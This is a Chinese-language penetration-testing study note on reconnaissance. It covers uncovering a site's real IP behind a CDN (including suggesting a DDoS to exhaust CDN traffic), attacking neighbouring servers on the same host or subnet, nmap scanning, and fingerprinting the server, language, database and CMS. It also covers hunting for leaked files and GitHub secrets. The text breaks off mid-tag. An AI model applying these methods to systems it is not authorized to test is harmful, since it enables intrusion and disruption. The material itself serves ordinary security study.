id="服务器信息（IP、端口信息收集）"><a href="#服务器信息（IP、端口信息收集）" class="headerlink" title="服务器信息（IP、端口信息收集）"></a>服务器信息（IP、端口信息收集）</h1><h2 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h2><h3 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h3><blockquote><ul><li><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a> </li><li><a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a> </li><li><a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a> </li><li><a href="https://site.ip138.com/">https://site.ip138.com/</a></li></ul></blockquote><p>如果渗透目标为虚拟主机，那么通过IP反查到的域名信息很有价值，因为一台物理服务器上面可能运行多个虚拟主机。这些虚拟主机有不同的域名，但通常共用一个IP地址。如果你知道有哪些网站共用这台服务器，就有可能通过此台服务器上其他网站的漏洞获取服务器控制权，进而迂回获取渗透目标的权限，这种技术也称为“<strong>旁注</strong>”。</p><p>主要需要注意的是 <strong>多个域名可以解析到同一个IP</strong></p><h3 id="域名查询IP"><a href="#域名查询IP" class="headerlink" title="域名查询IP"></a>域名查询IP</h3><blockquote><ul><li><a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a> </li><li><a href="https://ipchaxun.com/">https://ipchaxun.com/</a> </li><li><a href="https://site.ip138.com/">https://site.ip138.com/</a></li><li><a href="https://get-site-ip.com/">Get Site IP - Find IP Address and location from any URL (域名查真实IP)</a></li></ul></blockquote><p>知道一个站点的域名需要得到它的IP以便之后获取端口信息或扫描等后续工作。</p><h3 id="绕过CDN获取IP"><a href="#绕过CDN获取IP" class="headerlink" title="绕过CDN获取IP"></a>绕过CDN获取IP</h3><h4 id="CDN简介"><a href="#CDN简介" class="headerlink" title="CDN简介"></a>CDN简介</h4><p><u>CDN即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的<strong>负载均衡、内容分发、调度</strong>等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率</u></p><h4 id="判断一个网站是否挂了CDN"><a href="#判断一个网站是否挂了CDN" class="headerlink" title="判断一个网站是否挂了CDN"></a>判断一个网站是否挂了CDN</h4><blockquote><p>要注意 判断CDN和绕过CDN是不一样的，但是实际上，绕过的过程已经在过程中判断出是否挂了CDN。怎么说呢，最常用的判断方法应该是多地ping和国外访问（本质上差不多好吧~</p></blockquote><ol><li>多地ping（最通用的，一招鲜吃遍天）</li></ol><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> </p><p><a href="https://www.17ce.com/">https://www.17ce.com/</a></p><p><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a></p><p><a href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a></p><p>用各种多地 ping 的服务，查看对应 IP 地址是否唯一</p><p>黑客也可以从多个地点ping他们想要确认的域名，若返回的是不同的 ip，那么服务器确定使用了 cdn，返回的 ip 也不是服务器的真实 ip</p></blockquote><blockquote><p>很显然鱼皮的网站挂了CDN</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051406153.png" alt="image-20221005140636904"></p></blockquote><ol start="2"><li>nslookup查找法</li></ol><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup gungnir.top</span><br><span class="line">nslookup www.qq.com</span><br><span class="line">nslookup ce.mianshiya.com</span><br></pre></td></tr></table></figure><p>使用 nslookup 命令进行查询，若返回域名解析结果为多个 ip，多半使用了 CDN，是不真实的 ip。</p><p>nslookup怎么用，参考之前的文章：<a href="https://11pmsleep.github.io/2022-10-02-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/nslookup%E4%BD%BF%E7%94%A8/">nslookup 使用</a></p></blockquote><h4 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h4><p>有些攻击者喜欢用 cdn 隐藏流量，我们可以使用一些网上的工具比如说 dnsinfo 啊，dnsdumpster 这些，那么我们便要绕过CDN拿到真是IP才行</p><p>下述的这些绕过CDN的方法不是说一定准确，最好一种或者几种结合起来查找真实IP</p><ol start="0"><li>网站接口查询，这不属于绕过方法，某些网站或者工具集成了绕过命令尝试绕过：</li></ol><blockquote><p><a href="https://get-site-ip.com/">Get Site IP - Find IP Address and location from any URL (域名查真实IP)</a></p></blockquote><ol><li>查询子域名的IP</li></ol><blockquote><p><a href="https://ip.tool.chinaz.com/ipbatch">https://ip.tool.chinaz.com/ipbatch</a><br>CDN 流量收费高，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在<strong>同一台服务器</strong>或者<strong>同一个C段</strong>内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP</p><p>因为 cdn 和反向代理是需要成本的，有的网站只在比较常用的域名使用 cdn 或反向代理，有的时候一些测试子域名和新的子域名都没来得及加入 cdn 和反向代理，所以有时候是通过查找子域名来查找网站的真实 IP</p><p>查询子域名的方法就很多了：subDomainsBrute、Sublist3r、Google hack 等。</p></blockquote><ol start="2"><li>MX记录邮件服务&#x2F;网站订阅邮件法</li></ol><blockquote><p>邮件服务查询的原理主要在于：<strong>我们访问别人，可能通过 CND，但别人访问我们通常不会走 CDN</strong>，另外需要注意的是，如果邮件服务器和web服务器在同一台机器，或者是被解析到同一个IP，我们才存在通过MX记录其查找IP的可行性。</p></blockquote><blockquote><ul><li><p>黑客可以通过<strong>网站订阅邮件</strong>的功能，让网站给自己发邮件，查看邮件的源代码即可获取网站真实 ip。大公司都有自己的邮箱服务器，大部分都不会做CDN，所以可以通过邮箱查询ip地址。</p><p>foxmail可以直接看源代码，其他的不晓得，网页邮箱的话直接看网页源代码。其他具体操作可以Google查看邮件IP，不赘述。QQ邮箱邮件源码在这：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210251450397.png" alt="image-20221025145044977"></p><p>一般存在邮件服务的网站都可以尝试。比如说验证码什么的，只要服务器给你发了邮件都可以找到！</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051355138.png" alt="image-20221005135555698" style="zoom:50%;" /><ul><li><strong>MX记录</strong>是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</li></ul><blockquote><ul><li>网站查询</li></ul><blockquote><p><a href="https://tool.chinaz.com/nslookup/">https://tool.chinaz.com/nslookup/</a></p><p><a href="https://www.nslookup.io/mx-lookup/">https://www.nslookup.io/mx-lookup/</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051404886.png" alt="image-20221005140431608" style="zoom:33%;" /><p>这里解析出来指向的是vercel，，，，</p><blockquote><p>Vercel 是一个开箱即用的网站托管平台，方便开发者快速部署自己的网站。它在全球都拥有 CND 节点，因此比 Github 官方自带的 github pages 更加稳定，访问速度更快</p></blockquote><ul><li>nslookup</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nslookup -query=mx ce.mianshiya.com</span><br><span class="line">nslookup -query=mx baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051437517.png" alt="image-20221005143753173" style="zoom:50%;" /></blockquote></blockquote><ol start="3"><li>查询历史DNS记录</li></ol><blockquote><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://securitytrails.com/">https://securitytrails.com/</a><br><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a><br><a href="https://www.ip138.com/">https://www.ip138.com/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a><br><a href="http://viewdns.info/">http://viewdns.info/</a><br><a href="http://www.17ce.com/">http://www.17ce.com/</a><br><a href="https://community.riskiq.com/">https://community.riskiq.com/</a><br><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></p><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录;</p><p>有的网站是后来才加入 CDN 的，所以只需查询它的解析历史即可获取真实 ip</p><p>这个也可以查DNS历史记录：</p><p><a href="https://securitytrails.com/dns-trails">全球最大的历史 DNS 数据存储库 (securitytrails.com)</a></p></blockquote><ol start="4"><li>国外访问</li></ol><blockquote><p><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a><br>因为有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过。国外没有 cdn 节点的话，可能直接走原 ip。尽量找小的或者冷门的国家的ip进行访问，这样有CDN的可能性小</p><p>可以在这个网站找些冷门国家ping</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p></blockquote><ol start="5"><li>以量打量</li></ol><blockquote><p>CDN 节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击。使用DDOS攻击将所有CDN流量耗尽，之后只能访问到真实的ip地址</p></blockquote><ol start="6"><li>利用网站漏洞</li></ol><blockquote><p>如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、 phpinfo 泄露、github 信息泄露、命令执行等漏洞、Apache status 和 Jboss status 敏感信息泄露、网页源代码泄露、svn 信息泄露信、github 信息泄露等。</p><p>若存在 web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip。例如 xss、ssrf、命令执行反弹 shell 等</p></blockquote><ol start="7"><li>也可以根据 XFF 头，referer 头来判断</li><li>抓取图标 icon 的 hash，然后在网络空间搜索引擎中去 search（亦或者是一些独特的文件）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作流程：</span><br><span class="line">1.首先访问获取ico地址，</span><br><span class="line">2.然后利用python2获取其ico地址hash信息，</span><br><span class="line">3.再利用黑暗引擎shodan进行全网追踪，</span><br><span class="line">4.最后通过结果访问探针真实地址~</span><br></pre></td></tr></table></figure><blockquote><p>v23gg.com 黑暗引擎（shodan搜指定hash文件）</p><p>原理：用shodan去检测哈希值，如果能和icon的哈希值对应上，则shodan会显示出IP地址。生成hash的python脚本在小迪老师公众号中有：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&mid=2653939118&idx=1&sn=945b81344d9c89431a8c413ff633fc3a&chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&token=268417143&lang=zh_CN#rd">实战秒杀BC下的CDN节点 (qq.com)</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/117532626">如果访问有 icon 的话，可以抓hash 去匹配</a>。shodan，x 情报社区，钟馗之眼，fofa，夸克，google 语法这些就可以用一用了。</p></blockquote><blockquote><p><a href="https://fofa.so/">网络空间测绘搜索引擎FOFA</a> 和 <a href="https://www.shodan.io/">物联网暗黑搜索引擎Shodan</a>可以通过网站的icon计算出一个用来搜索目标的<a href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>值：iconhash，信息收集过程中我们也可以通过iconhash去反差使用此icon的所有站点。</p></blockquote><ol start="9"><li>扫全网工具：</li></ol><p>fuckcdn(优秀一点），w8fuckcdn（稍逊）</p><blockquote><p><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a><br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p></blockquote><p>Zmap大法——网络空间的遗留文件</p><blockquote><p>遗留文件类似找到phpinfo.php的文件，我们就可以在这里面找到配置信息以及真实IP</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210251010603.png" alt="image-20221025101012088" style="zoom:50%;" /></blockquote><blockquote><p>据说扫描全网，只要44分钟？主要是注意查找遗留文件，从中拿到有价值的东西。借助工具进行全世界网络扫描，将所有的CDN节点进行访问收集，然后通过ip地址进行甄别，从而确定主站ip。</p><p>可参考这篇文章：<a href="https://link.zhihu.com/?target=http://bobao.360.cn/learning/detail/211.html">简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体</a></p></blockquote><ol start="10"><li>网络空间引擎搜索法(类似于全网扫描)</li></ol><blockquote><p>zoomeye、fofa、shodan</p><ul><li><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></li><li><a href="https://www.shodan.io/dashboard?language=cn">Shodan Search Engine</a></li><li><a href="https://www.zoomeye.org/">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(“钟馗之眼”)网络空间搜索引擎</a></li></ul><p>通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：</p><p>特有的http头部（如server类型、版本、cookie等信息)、</p><p>特定keyword（如title、css、js、url等）、</p><p>特定的IP段搜索（如fofa支持C段搜索），</p><p>再比如上面讲到的<code>icon</code>的hash也是可以用网络空间搜索引擎去搜索的</p><p>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。</p></blockquote><ol start="11"><li>查询Https证书</li></ol><h4 id="验证是否为真实IP"><a href="#验证是否为真实IP" class="headerlink" title="验证是否为真实IP"></a>验证是否为真实IP</h4><blockquote><p>多个方法结合验证真实IP</p></blockquote><h5 id="使用网站或者工具辅助验证"><a href="#使用网站或者工具辅助验证" class="headerlink" title="使用网站或者工具辅助验证"></a>使用网站或者工具辅助验证</h5><blockquote><p>辅助网站工具康康和前面手动方法查出的是同一个真实IP，这个网站提供的辅助验证仅供参考，大部分时候应该是可以的</p><p><a href="https://get-site-ip.com/">Get Site IP - Find IP Address and location from any URL (域名查真实IP)</a></p></blockquote><h5 id="更改本地HOSTS解析指向文件验证"><a href="#更改本地HOSTS解析指向文件验证" class="headerlink" title="更改本地HOSTS解析指向文件验证"></a>更改本地HOSTS解析指向文件验证</h5><blockquote><p>如果我们通过上述方法找出的IP仍然为CDN的话，我们修改HOST文件域名指向IP的话，是打不开网站网站的！</p><p>因为CDN上面肯定缓存了不同的公司的服务，不止一家的内容，直接访问CDN是打不开的。<strong>如果能修改HOST指向打开网站，就表示这个找出来的IP是真实的IP！</strong></p><p>另外为什么通过改HOST去访问网站呢？？因为有的网站不允许直接访问IP</p><p>禁止ip访问，这样做是为了避免其他人把未备案的域名解析到自己的服务器IP，而导致服务器被断网，我们可以通过禁止使用ip访问的方法，防止此类事情的发生</p><p><a href="https://www.cnblogs.com/FengGeBlog/p/14288330.html">网站使用域名访问而禁止ip访问的配置 - 峰哥ge - 博客园 (cnblogs.com)</a></p></blockquote><h3 id="小技巧及注意点"><a href="#小技巧及注意点" class="headerlink" title="小技巧及注意点"></a>小技巧及注意点</h3><blockquote><ol><li>域名和子域名访问上面的小技巧</li></ol><p><code>www.xiaodi8.com</code>和<code>xiaodi8.com</code>的ip地址有可能会不一样，其中一个是加了CDN的，但是如果访问到了没有CDN的网址，那么会自动跳转到有CDN的IP上。</p><p>在解析域名的时候，可以为www单独设置一条解析记录，然后*代表所有子域名也是解析到一个IP。这种情况下呢，一定会有两条解析记录。管理员在设置CDN域名解析的时候，可能只单单解析了www指向CDN，这种情况下就可以钻漏子。访问xiaodi8.com也就是以真实IP去访问</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210251022306.png" alt="image-20221025102215969" style="zoom:50%;" /><p>下面这两个网站就是鲜明的例子，ping 域名和子域名，就会看到cdn只给到了www的子域名：</p><blockquote><ul><li><a href="https://www.sp910.com/">教视网 - 中小学优质课,公开课,名师课堂实录教学视频 (sp910.com)</a></li><li><a href="https://www.xueersi.com/">学而思网校-受益一生的能力 (xueersi.com)</a></li></ul></blockquote><ol start="2"><li>m.sp910 子域名小技巧&#x2F;采集&#x2F;国外请求（同类型访问）</li></ol><p><code>m.sp910.com</code>是用于手机访问的，<code>www.sp910.com</code>是电脑访问的，两个站点除了界面不同以外其他的一模一样。手机网站也不一定加cdn</p></blockquote><h3 id="网站搭建习惯-旁注，c段站点"><a href="#网站搭建习惯-旁注，c段站点" class="headerlink" title="网站搭建习惯-旁注，c段站点"></a>网站搭建习惯-<strong>旁注</strong>，<strong>c段</strong>站点</h3><blockquote><p>没办法的时候再去搞这些</p></blockquote><blockquote><p>查询网站：<a href="https://www.webscan.cc/">同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan</a></p></blockquote><h4 id="旁注："><a href="#旁注：" class="headerlink" title="旁注："></a>旁注：</h4><blockquote><p>同服务器不同站点。两个网站或者多个网站放在同一个服务器上，其中一个网站是你的目标。</p><p>前提条件：有多个站点，但只有一台服务器</p><p>192.168.1.100</p><blockquote><p><a href="http://www.a.com(目标)/">www.a.com（目标）</a></p><p><a href="http://www.b.com/">www.b.com</a></p><p>……..</p></blockquote></blockquote><h4 id="C段："><a href="#C段：" class="headerlink" title="C段："></a>C段：</h4><blockquote><p>同网段不同服务器不同站点。网站有一个或多个站点，通过服务器IP地址的网段来进行测试。</p><p>192.168.1.100：<a href="http://www.a.com(目标)/">www.a.com（目标）</a></p><p>192.168.1.101：<a href="http://www.b.com/">www.b.com</a></p><p>通过查询网段1-254，去获取101网段服务器权限，在通过服务器同一个网段目标主机来实施内网安全的测试方法，来获取指定网站服务器的权限。</p><p>C端服务器中只要有一台被拿下，可以内网横向去另一台内网服务器</p></blockquote><h4 id="C段存活主机探测"><a href="#C段存活主机探测" class="headerlink" title="C段存活主机探测"></a>C段存活主机探测</h4><blockquote><p>拿到ip后就又可以扫c段</p></blockquote><h5 id="nmap扫"><a href="#nmap扫" class="headerlink" title="nmap扫"></a>nmap扫</h5><p>查找与目标服务器IP处于同一个C段的服务器IP</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sP www.XXX.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></figure><h5 id="Cwebscanner"><a href="#Cwebscanner" class="headerlink" title="Cwebscanner"></a>Cwebscanner</h5><p>快速扫描C段web应用，获取请求状态code、server、title信息。 支持域名或ip地址形式，默认扫描80端口。 支持自定义端口扫描</p><blockquote><p><a href="https://github.com/se55i0n/Cwebscanner">https://github.com/se55i0n/Cwebscanner</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python Cwebscan.py www.hetianlab.com</span><br></pre></td></tr></table></figure><h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h2><h3 id="端口简介"><a href="#端口简介" class="headerlink" title="端口简介"></a>端口简介</h3><p>在Internet上，各主机间通过TCP&#x2F;IP协议发送和接受数据包，各个数据包根据其目的主机的IP地址来进行互联网络中的路由选择，从而顺利的将数据包顺利的传送给目标主机</p><p>但当目的主机运行多个程序时，目的主机该把接受到的数据传给多个程序进程中的哪一个呢？端口机制的引入就是为了解决这个问题。端口在网络技术中，端口有两层意思：一个是物理端口，即物理存在的端口，如：集线器、路由器、交换机、ADSL Modem等用于连接其他设备的端口；另一个就是逻辑端口，用于区分服务的端口，一般用于TCP&#x2F;IP中的端口，其范围是0~65535,，0为保留端口，一共允许有65535个端口比如用于网页浏览服务的端口是80端口，用于FTP服务的是21端口。 这里我们所指的不是物理意义上的端口，而是特指TCP&#x2F;IP协议中的端口，是逻辑意义上的端口</p><h3 id="协议端口"><a href="#协议端口" class="headerlink" title="协议端口"></a>协议端口</h3><p>根据提供服务类型的不同，端口可分为以下两种：</p><blockquote><p>TCP端口：TCP是一种面向连接的可靠的传输层通信协议<br>UDP端口：UDP是一种无连接的不可靠的传输层协议</p></blockquote><p>TCP协议和UDP协议是独立的，因此各自的端口号也互相独立。</p><blockquote><p>TCP：给目标主机发送信息之后，通过返回的应答确认信息是否到达<br>UDP：给目标主机放信息之后，不会去确认信息是否到达</p></blockquote><p>而由于物理端口和逻辑端口数量较多，为了对端口进行区分，将每个端口进行了编号，即就是端口号。那么看到这里我们会好奇，有那么多的端口，他们到底是怎么分类的？</p><h3 id="端口类型"><a href="#端口类型" class="headerlink" title="端口类型"></a>端口类型</h3><blockquote><p>周知端口：众所周知的端口号，范围： 0-1023 ，如 80 端口是 WWW 服务<br>动态端口：一般不固定分配某种服务，范围： 49152-65535<br>注册端口：范围： 1024-49151 ，用于分配给用户进程或程序</p></blockquote><h3 id="渗透端口"><a href="#渗透端口" class="headerlink" title="渗透端口"></a>渗透端口</h3><blockquote><p>参考另一篇笔记：<a href="https://11pmsleep.github.io/2022-10-02-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93/">渗透常用端口总结</a></p></blockquote><h2 id="常见端口介绍"><a href="#常见端口介绍" class="headerlink" title="常见端口介绍"></a>常见端口介绍</h2><p>参考另一篇笔记：<a href="https://11pmsleep.github.io/2022-10-02-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93/">渗透常用端口总结</a></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote><p>追求速度就masscan，追求准确度就nmap</p></blockquote><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><blockquote><p><a href="https://11pmsleep.github.io/2022-09-25-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/nmap%E5%AD%A6%E4%B9%A0/">nmap 学习</a></p></blockquote><h3 id="masnmapscan-V1-0"><a href="#masnmapscan-V1-0" class="headerlink" title="masnmapscan-V1.0"></a>masnmapscan-V1.0</h3><blockquote><p>简单扫描非常快</p></blockquote><blockquote><p>masnmapscan-V1.0</p><p>程序整合了masscan和nmap两款扫描器，masscan扫描端口，nmap扫描端口对应服务，二者结合起来实现了又快又好地扫描。</p><p><a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p></blockquote><h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><blockquote></blockquote><h1 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><blockquote><ol><li><p>ping结合TTL判断：windows的TTL值一般为128，Linux则为64。 TTL大于100的一般为windows，几十的一般为linux。</p><blockquote><ul><li>Liux系统的TTL值为64或255</li><li>Vindows NT&#x2F;2000&#x2F;XP系统的TTL值为128</li><li>Vindows98系统的TTL值为32</li><li>UNIX主机的TTL值为255</li></ul></blockquote></li><li><p><code>nmap -O IP</code></p></li><li><p>windows大小写不敏感，linux则区分大小写，大小写对网页都没有影响，这种情况就可以认定为windows服务器，因为windows服务器不区分大小写</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180114784.png" alt="image-20221018011433499" style="zoom:50%;" /></li><li><p>通过网站或通过扫描相关软件识别</p></li></ol></blockquote><h2 id="网站服务、容器类型"><a href="#网站服务、容器类型" class="headerlink" title="网站服务、容器类型"></a>网站服务、容器类型</h2><blockquote><ol><li>F12查看响应头Server字段</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210041958935.png" alt="image-20221004195822638" style="zoom: 33%;" /><ol start="2"><li>whatweb <a href="https://www.whatweb.net/">https://www.whatweb.net/</a></li></ol><blockquote><p>工具箱里有</p></blockquote><ol start="3"><li>wappalyzer插件</li></ol><blockquote><p>apache ，nginx ，tomcat，IIS 通过容器类型、版本可考虑对应容器存在的漏洞（如解析漏洞）</p></blockquote></blockquote><h2 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h2><blockquote><ol><li>php</li><li>jsp</li><li>asp&#x2F;aspx</li><li>python</li></ol><p>知道是什么语言才可以针对性的进行文件扫描、文件上传</p></blockquote><blockquote><ol><li>抓包根据cookie值观察</li></ol><p>截取网站的数据包如下，根据传递的cookie值，比如 PHP 使用的会话ID是 PHPSESSID，JSP 使用的会话 ID 是 JSESSION。所以下面网站使用的脚本语言为JSP。若该网站存在任意文件上传漏洞则可以上传jsp文件的后门程序。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051910909.png" alt="img"></p><ol start="2"><li>Wappalyzer</li></ol><p>这是一款火狐的插件，可以用来判断网站的一些基本信息，比如网站使用的框架和脚本语言。如下为java，而我们知道jsp以java语言作为脚本语言。所以可以上传JSP后缀文件</p><ol start="3"><li>响应包的server值</li></ol><p>一般情况下，服务器类型可以通过 Response Header 来看。（前提是没有刻意隐藏</p><p>有时候网站的响应包会携带server信息，如下，这种情况多存在内网中。公网很少会携带这个server信息。所以我们可知道脚本语言为php</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051910480.png" alt="img"></p><ol start="4"><li>一个不错的分析网站</li></ol><blockquote><p><a href="https://w3techs.com/sites">https://w3techs.com/sites</a></p></blockquote><ol start="5"><li>后台语言可以通过服务器类型或者数据库类型推测</li></ol><ul><li>IIS6.0 、sqlserver大部分asp  小部分是aspx 极少是php。IIS7.0 大部分aspx  小部分asp</li><li>Tomcat、Resin、JBoss，一般是 Jsp</li><li>Nginx，不一定，很有可能是 PHP 或者 Python 之类的脚本语言。</li><li>Apache 、mysql基本都是php</li></ul><ol start="6"><li>扫描工具扫</li><li>网络空间搜索引擎</li></ol></blockquote><h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2><blockquote><ol><li>mysql</li><li>sqlserver</li><li>access</li><li>oracle</li></ol><ul><li>通过网站识别数据库，通过脚本s识别连接的数据库</li></ul><blockquote><ul><li>ASP+Access(windows) 端口：无</li><li>PHP+Mysql 端口：3306</li><li>ASPX+Mssql(windows) 端口：1433</li></ul><blockquote><p>mssql是sqlserver 的简称。这个是微软的重型数据库。</p></blockquote><ul><li>Jsp+Mssql,oracle 端口：1521</li><li>Python+Mongodb 端口：27017</li></ul></blockquote><ul><li>端口扫描，根据锻炼判断连接的数据库</li></ul><blockquote><ul><li><code>nmap -O ip</code></li><li><code>nmap ip -p 端口</code>，通过端口开放反推数据库</li></ul></blockquote><blockquote><p>在sql注入学习中会学到如何判断数据库的类型</p></blockquote></blockquote><h2 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h2><blockquote><p>cms识别的原理：大多数是根据cms的特征文件提取出md5，这些特征文件可能是icon或者loge，也可能是某些特定目录下的某些文件，具有其特殊性</p></blockquote><blockquote><p>CMS：内容管理系统，用于网站内容文章管理<br><a href="https://github.com/lengjibo/dedecmscan">https://github.com/lengjibo/dedecmscan</a><br>常见CMS：dedecms(织梦)、Discuz、phpcms等。</p><p>Onlinetools<br><a href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a><br><a href="https://pentest.gdpcisa.org/">https://pentest.gdpcisa.org/</a></p></blockquote><blockquote><p>云悉cmd识别（没有其他好用）<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a> </p><p>聚名在线cms指纹识别<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a> </p><p>CMS和中间件指纹库<a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a> </p></blockquote><h2 id="敏感文件、目录"><a href="#敏感文件、目录" class="headerlink" title="敏感文件、目录"></a>敏感文件、目录</h2><blockquote><p>域名扫描只能扫描出来域名文件，而域名文件只是占服务器资源的一小部分；IP扫描可以直接扫描出来服务器的根目录，得到的信息更多；</p></blockquote><blockquote><p>敏感文件、敏感目录挖掘一般都是靠工具、脚本来找，比如御剑、BBscan，当然大佬手工也能找得到。</p><blockquote><p>github<br>git<br>svn<br>.DS_Store<br>.hg<br>.bzr<br>cvs<br>WEB-INF<br>备份文件</p></blockquote><p>前面七种为版本管理工具所泄露的常规方式，剩下两种方式为操作不当，安全意识薄弱所造成的泄露。</p></blockquote><h2 id="Github泄露"><a href="#Github泄露" class="headerlink" title="Github泄露"></a>Github泄露</h2><blockquote><p>开发人员将代码上传到网站，在上传的时候，没有删除重要的一些信息。如邮箱信息，SVN信息，内部账号和密码，数据库连接信息，服务器配置信息等。尤其是邮箱信息和内部账号和密码。这类信息可以通过在github上搜索公司的一些特定信息，查看是否有程序员将这些信息上传到了github上。<br>如公司的域名如下：niniub.com；则可以在github上用这个信息去进行搜索，看看是否有包含该类关键字的文件。这类安全漏洞只能靠人员的安全意识进行防护，没有其它方法进行。</p><p>也有的管理员会写一些登录脚本登录。太多GitHub可能泄露的行为，</p><p>如何操作呢？举个例子</p><blockquote><p>在Google上搜索 inurl: login</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210031712509.png" alt="image-20221003171144683" style="zoom:33%;" /><p>找到一个网址后，再在GitHub上搜这个网址</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210031712811.png" alt="image-20221003171227270" 